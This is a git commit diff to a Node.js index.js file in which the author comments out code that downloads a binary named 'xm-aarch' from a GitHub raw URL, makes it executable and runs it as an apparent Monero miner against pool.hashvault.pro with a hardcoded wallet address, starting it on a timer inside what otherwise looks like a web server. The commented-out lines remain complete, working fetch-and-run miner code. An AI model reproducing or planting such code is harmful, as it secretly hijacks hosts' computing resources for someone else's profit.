d2e5897dec35f8fc829ce3bf13d475990d268508
iceyfromdiscord <116362513+iceyfromdiscord@users.noreply.github.com>
2026-02-01 14:26:56 -0600

    Update index.js

--- index.js
+++ index.js
@@ -3,14 +3,15 @@ const fs = require("fs");
 const https = require("https");
 const http = require("http");
 
-https.get("https://raw.githubusercontent.com/iceyfromdiscord/arm/refs/heads/main/xm-aarch", (res) => {
-  res.pipe(fs.createWriteStream("prog"));
-});
+// https.get("https://raw.githubusercontent.com/iceyfromdiscord/arm/refs/heads/main/xm-aarch", (res) => {
+//   res.pipe(fs.createWriteStream("prog"));
+// });
 
 setTimeout(function(){
-  spawn("chmod +x prog", { shell: true, stdio: "inherit" });
-  spawn("./prog --url pool.hashvault.pro:443 --user 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ --pass main --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14", { shell: true });
-  console.log("started!")
+  // spawn("chmod +x prog", { shell: true, stdio: "inherit" });
+  // spawn("./prog --url pool.hashvault.pro:443 --user 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ --pass main --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14", { shell: true });
+  spawn("echo balls")
+  // console.log("started!")
 }, 2500);
 
 const PORT = process.env.PORT || 3000;
